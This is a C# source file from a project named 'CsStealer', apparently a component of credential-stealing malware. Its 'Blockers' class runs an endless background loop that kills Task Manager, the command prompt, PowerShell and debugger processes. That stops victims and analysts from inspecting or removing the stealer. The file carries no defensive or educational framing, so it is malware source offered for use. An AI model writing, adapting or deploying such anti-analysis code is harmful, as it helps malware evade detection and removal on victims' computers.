using System;
using System.Diagnostics;

namespace CsStealer
{
    public class Blockers
    {
        public static bool PowershellCanBeKilled = true;
        public static bool CommandPromptCanBeKilled = true;

        private static void KillProcess(Process[] Processes)
        {
            foreach (Process Proc in Processes)
            {
                try
                {
                    Proc.Kill();
                }
                catch { }
            }
        }

        private static void MainLoop()
        {
            string[] Processes = { "taskmgr", "cmd", "powershell", "x64dgb", "x86dbg" };

            while (true)
            {
                foreach (string ProcessName in Processes)
                {
                    if (ProcessName == "powershell" && PowershellCanBeKilled)
                    {
                        try
                        {
                            Process[] _Procs = Process.GetProcessesByName(ProcessName);
                            KillProcess(_Procs);
                        }
                        catch { }
                    }
                    else if (ProcessName == "cmd" && CommandPromptCanBeKilled)
                    {
                        try
                        {
                            Process[] _Procs = Process.GetProcessesByName(ProcessName);
                            KillProcess(_Procs);
                        }
                        catch { }
                    }
                    else
                    {
                        try
                        {
                            Process[] _Procs = Process.GetProcessesByName(ProcessName);
                            KillProcess(_Procs);
                        }
                        catch { }
                    }
                }
            }
        }

        public static void Start()
        {
            Thread T = new Thread(MainLoop);
            T.Start();
        }
    }
}